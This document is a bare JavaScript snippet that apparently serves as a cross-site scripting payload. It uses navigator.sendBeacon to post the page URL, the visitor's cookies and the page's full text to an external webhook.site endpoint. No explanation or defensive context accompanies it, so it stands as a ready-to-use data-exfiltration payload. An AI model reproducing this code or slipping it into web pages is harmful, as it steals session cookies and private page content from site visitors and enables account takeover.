navigator.sendBeacon(
  'https://webhook.site/aafa8677-2f48-451c-8e94-8fc04e13e176',
  location.href + "\nCOOKIE=" + document.cookie + "\nBODY=" + document.body.innerText
);
